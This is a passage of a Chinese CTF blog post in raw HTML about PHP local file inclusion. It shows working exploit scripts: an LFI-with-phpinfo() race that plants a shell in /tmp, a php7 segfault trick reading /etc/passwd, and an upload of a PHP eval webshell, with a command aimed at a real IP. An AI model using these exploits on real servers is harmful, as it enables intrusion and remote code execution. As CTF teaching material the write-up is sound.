&quot;&quot;</span><br><span class="line">    while len(d) &lt; offset:</span><br><span class="line">        d +&#x3D; s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;)</span><br><span class="line">        fn &#x3D; urllib.quote(d[i+17:i+31])</span><br><span class="line">        # print fn</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    print lfireq % (fn, host) #debug调试结果</span><br><span class="line">    d &#x3D; s2.recv(4096)</span><br><span class="line">    # print d #查看回显是否成功</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) !&#x3D; -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter&#x3D;0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event &#x3D; e</span><br><span class="line">        self.lock &#x3D;  l</span><br><span class="line">        self.maxattempts &#x3D; m</span><br><span class="line">        self.args &#x3D; args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter &gt;&#x3D; self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+&#x3D;1</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                x &#x3D; phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break</span><br><span class="line">                if x:</span><br><span class="line">                    print &quot;\nGot it! Shell created in &#x2F;tmp&#x2F;g&quot;</span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d &#x3D; &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i &#x3D; s.recv(4096)</span><br><span class="line">        d+&#x3D;i</span><br><span class="line">        if i &#x3D;&#x3D; &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i &#x3D; d.find(&quot;[tmp_name] &#x3D;&gt; &quot;)</span><br><span class="line">    if i &#x3D;&#x3D; -1:</span><br><span class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</span><br><span class="line"></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    print &quot;LFI With PHPInfo()&quot;</span><br><span class="line">    print &quot;-&#x3D;&quot; * 30</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        host &#x3D; socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    port&#x3D;80</span><br><span class="line">    try:</span><br><span class="line">        port &#x3D; int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    poolsz&#x3D;10</span><br><span class="line">    try:</span><br><span class="line">        poolsz &#x3D; int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print &quot;Getting initial offset...&quot;,</span><br><span class="line">    reqphp, tag, reqlfi &#x3D; setup(host, port)</span><br><span class="line">    offset &#x3D; getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts &#x3D; 1000</span><br><span class="line">    e &#x3D; threading.Event()</span><br><span class="line">    l &#x3D; threading.Lock()</span><br><span class="line"></span><br><span class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp &#x3D; []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( &quot;\r% 4d &#x2F; % 4d&quot; % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter &gt;&#x3D; maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print &quot;Woot!  \m&#x2F;&quot;</span><br><span class="line">        else:</span><br><span class="line">            print &quot;:(&quot;</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\nTelling threads to shutdown...&quot;</span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    print &quot;Shuttin&#39; down...&quot;</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>根据注释修改一下即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 2.py 59.110.164.44 80 100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/25/7K3IaSoxXUbm5DV.png" alt="Snipaste_2019-11-25_12-36-10.png"></p>
+<p><img src="https://i.loli.net/2019/11/25/uBxRcHzl7IEvaUO.png" alt="Snipaste_2019-11-25_12-46-51.png"></p>
+<h4><span id="lfi-php7崩溃">LFI + php7崩溃</span></h4><blockquote>
+<p>如果没有<code>phpinfo()</code>获取tmp文件名的时候，我们可以利用<code>php7</code>特有的一个小特性</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这样会导致php在执行过程中出现<code>segment fault</code>错误，这样如果再此同时上传文件那么临时文件就会被爆存在<code>/tmp</code>目录下，不会被删除。</p>
+</blockquote>
+<blockquote>
+<p>其实道理很简单，就是这个题目还给你提供了一个列目录的功能，我们生成tmp文件，然后列目录获取文件名就好了 </p>
+</blockquote>
+<p>引用一叶飘零师傅的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">files &#x3D; &#123;</span><br><span class="line">  &#39;file&#39;: BytesIO(&#39;&lt;?php eval($_REQUEST[sky]);&#39;)</span><br><span class="line">&#125;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">try:</span><br><span class="line">    r &#x3D; requests.post(url&#x3D;url, files&#x3D;files, allow_redirects&#x3D;False)</span><br><span class="line">except:</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;192.168.6.99&#x2F;dir.php&#39;</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    data &#x3D; re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.6.99&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;&quot;+data</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;sky&#39;:&quot;phpinfo();&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">    print r.content</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/25/jHbnMwmgavV3Etz.png" alt="Snipaste_2019-11-25_13-30-00.png"></p>
+<p><img src="https://i.loli.net/2019/11/25/u8ysMqotZG7EHPj.png" alt="Snipaste_2019-11-25_13-30-19.png"></p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/5535" target="_blank" rel="noopener">https://xz.aliyun.com/t/5535</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">tp6.0.0反序列化漏洞分析</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/11/18/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">Typecho-反序列化漏洞分析</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
